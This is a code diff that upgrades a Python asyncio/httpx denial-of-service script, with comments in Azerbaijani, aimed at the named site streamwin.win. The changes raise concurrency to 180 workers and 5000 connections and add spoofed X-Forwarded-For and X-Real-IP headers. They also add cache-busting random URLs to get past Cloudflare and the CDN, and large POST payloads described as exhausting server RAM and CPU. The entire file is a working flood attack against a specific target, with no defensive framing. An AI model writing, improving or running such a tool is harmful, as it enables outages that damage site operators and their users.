@@ -3,63 +3,88 @@ import httpx
 import random
 import string
 import time
+import os
 
+# --- EXTREME CONFIG ---
 TARGET_URL = "https://streamwin.win"
-WORKERS = 100 # Brauzer olmadığı üçün sayı 100-ə qaldıra bilərik
-BATCH_SIZE = 50 # Hər dalğada 50 sorğu
+WORKERS = 180           # Railway Paid üçün maksimuma yaxın
+BATCH_SIZE = 80         # Hər dalğada göndərilən asinxron paket sayı
+CONNECTION_LIMIT = 5000 # Eyni anda açıq qalan TCP bağlantıları
 
-def random_str(n=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+def random_string(length):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# Real brauzer başlıqları
-UA_LIST = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edge/124.0.0.0"
-]
+def get_extreme_headers():
+    ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Safari/537.36"
+    return {
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en-US,en;q=0.9,az;q=0.8",
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0",
+        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+        "X-Forwarded-Host": f"{random_string(5)}.google.com",
+        "X-Real-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+        "Service-Worker-Navigation-Preload": "true",
+        "Upgrade-Insecure-Requests": "1",
+        "Connection": "keep-alive"
+    }
 
-async def attack_worker(worker_id):
-    # Cloudflare HTTP/2 yoxlamasını keçmək üçün modern bir client
-    async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
-        print(f"🚀 Worker {worker_id} aktivdir...")
-        while True:
-            try:
-                tasks = []
-                for _ in range(BATCH_SIZE):
-                    headers = {
-                        "User-Agent": random.choice(UA_LIST),
-                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                        "Accept-Language": "en-US,en;q=0.9",
-                        "Accept-Encoding": "gzip, deflate, br",
-                        "Connection": "keep-alive",
-                        "Sec-Fetch-Dest": "document",
-                        "Sec-Fetch-Mode": "navigate",
-                        "Sec-Fetch-Site": "none",
-                        "Cache-Control": "max-age=0"
-                    }
-                    
-                    # Dinamik URL (Cloudflare Keşi üçün)
-                    url = f"{TARGET_URL}/?{random_str()}={random_str()}"
-                    
-                    # Random olaraq GET və ya POST (Backend-i yormaq üçün)
-                    if random.random() > 0.8:
-                        tasks.append(client.post(url, headers=headers, data={random_str(): random_str()}))
-                    else:
-                        tasks.append(client.get(url, headers=headers))
+async def extreme_flood(client, worker_id):
+    while True:
+        try:
+            # 1. URL Randomization (CDN Cache Bypass)
+            # Saytın daxili axtarış və ağır dinamik səhifələrinə fokuslanırıq
+            url = f"{TARGET_URL}/?{random_string(6)}={random_string(15)}&s={random_string(20)}"
+            
+            tasks = []
+            for _ in range(BATCH_SIZE):
+                headers = get_extreme_headers()
                 
-                # Bütün sorğuları eyni anda göndər
-                await asyncio.gather(*tasks, return_exceptions=True)
+                # 2. Vector A: Large Data POST (Server RAM/CPU Exhaustion)
+                if _ % 4 == 0:
+                    payload = {random_string(5): random_string(100) for _ in range(20)}
+                    tasks.append(client.post(url, headers=headers, data=payload, timeout=5))
                 
-            except Exception:
-                await asyncio.sleep(1) # IP bloklansa bir az gözlə
+                # 3. Vector B: Header Fuzzing GET (WAF/Cloudflare Bypass)
+                else:
+                    tasks.append(client.get(url, headers=headers, timeout=5))
+
+            # Bütün asinxron sorğuları eyni anda partlat (Rapid Reset Effect)
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Dinamik gözləmə (Serverin özünə gəlməsinə imkan verməyən sürət)
+            await asyncio.sleep(0.001)
+
+        except Exception:
+            await asyncio.sleep(0.5)
 
 async def main():
-    print(f"🔥 RAILWAY TURBO FLOOD INITIALIZED")
-    print(f"[*] Target: {TARGET_URL}")
+    print(f"💀 DEVASTATOR MODE ACTIVATED ON: {TARGET_URL}")
+    print("[!] Warning: This script uses maximum network bandwidth.")
     
-    # Bütün workerləri birdən başladırıq
-    workers = [attack_worker(i) for i in range(WORKERS)]
-    await asyncio.gather(*workers)
+    # Maksimum bağlantıya icazə verən TCP Konfiqurasiyası
+    limits = httpx.Limits(
+        max_connections=CONNECTION_LIMIT, 
+        max_keepalive_connections=CONNECTION_LIMIT // 2,
+        keepalive_expiry=30.0
+    )
+    
+    async with httpx.AsyncClient(
+        http2=True, 
+        verify=False, 
+        limits=limits,
+        headers={"Alt-Svc": 'h3=":443"; ma=86400'} # HTTP/3 dəstəyi təqlidi
+    ) as client:
+        
+        workers = [extreme_flood(client, i) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    # Performance üçün yüngül tənzimləmə
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n\n[!] Attack halted by operator.")
